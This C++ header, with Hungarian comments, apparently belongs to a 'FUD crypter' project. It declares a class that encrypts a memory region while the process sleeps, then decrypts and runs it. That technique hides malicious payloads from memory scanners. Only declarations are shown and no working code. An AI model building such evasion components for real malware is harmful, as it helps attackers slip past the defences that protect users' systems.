#pragma once
#include <windows.h>
#include <vector>
#include <cstdint>

namespace fud_crypter {
namespace memory {

class SleepObfuscator {
public:
    // Konstruktor: eltárolja a memóriacímet és a méretet
    SleepObfuscator(void* memory, size_t size, const std::vector<uint8_t>& key);

    // Várakozás közben titkosít, majd visszafejt és futtat
    void sleep_and_encrypt(DWORD milliseconds);

    // Közvetlen titkosítás/visszafejtés
    void encrypt();
    void decrypt();

private:
    void* memory_;
    size_t size_;
    std::vector<uint8_t> key_;
    bool encrypted_;
};

} // namespace memory
} // namespace fud_crypter
